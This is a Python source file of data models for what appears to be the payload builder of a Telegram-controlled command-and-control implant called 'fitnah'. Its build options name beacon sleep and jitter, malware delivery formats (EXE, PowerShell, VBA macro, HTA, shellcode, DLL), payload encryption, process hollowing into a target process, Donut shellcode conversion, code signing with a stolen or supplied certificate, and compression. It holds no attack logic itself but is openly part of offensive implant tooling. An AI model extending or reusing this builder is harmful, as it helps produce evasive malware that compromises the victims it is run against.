"""Builder data models — BuildRequest and BuildResult."""
from __future__ import annotations

import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Literal


class OutputFormat(str, Enum):
    EXE       = "exe"
    PS1       = "ps1"
    VBA       = "vba"
    HTA       = "hta"
    SHELLCODE = "shellcode"
    DLL       = "dll"


class Arch(str, Enum):
    X64 = "x64"
    X86 = "x86"


class Encrypt(str, Enum):
    NONE      = "none"
    AES256GCM = "aes-256-gcm"
    XOR       = "xor"


@dataclass
class BuildRequest:
    # targeting
    bot_token:   str
    chat_id:     str            # per-agent Telegram group/chat id
    agent_id:    str            # unique agent identifier

    # implant behaviour
    sleep:       int  = 5       # seconds between beacons
    jitter:      int  = 20      # ±% jitter on sleep

    # output options
    format:      OutputFormat = OutputFormat.EXE
    arch:        Arch         = Arch.X64
    encrypt:     Encrypt      = Encrypt.AES256GCM

    # optional
    process_inject:   str   = ""       # target process for hollowing (empty = standalone)
    icon:             str   = ""       # path to .ico for PE stamping
    output_dir:       str   = "build"

    # new: shellcode pipeline method
    shellcode_method: str   = "donut"  # "donut" | "raw" | "none"

    # new: signing
    sign:             bool  = False    # run signtool after build
    cert_path:        str   = ""       # path to .pfx certificate
    cert_password:    str   = ""       # PFX password

    # new: compression
    compress:         bool  = False    # LZMA compress the payload

    # derived
    output_name: str = ""       # filled in by engine if blank

    def __post_init__(self):
        if not self.output_name:
            ts = int(time.time())
            self.output_name = f"fitnah_{self.agent_id}_{ts}.{self.format.value}"


@dataclass
class BuildResult:
    ok:          bool
    path:        Path | None    = None
    error:       str            = ""
    warnings:    list[str]      = field(default_factory=list)
    size_bytes:  int            = 0
    sha256:      str            = ""
    build_log:   list[str]      = field(default_factory=list)
    artifacts:   list[Path]     = field(default_factory=list)  # all output files

    def summary(self) -> str:
        if not self.ok:
            return f"[FAILED] {self.error}"
        lines = [
            f"[OK] {self.path}",
            f"     Size      : {self.size_bytes:,} bytes",
            f"     SHA256    : {self.sha256}",
        ]
        if len(self.artifacts) > 1:
            lines.append(f"     Artifacts : {len(self.artifacts)} files")
            for a in self.artifacts:
                lines.append(f"       - {a}")
        for w in self.warnings:
            lines.append(f"     WARN      : {w}")
        return "\n".join(lines)
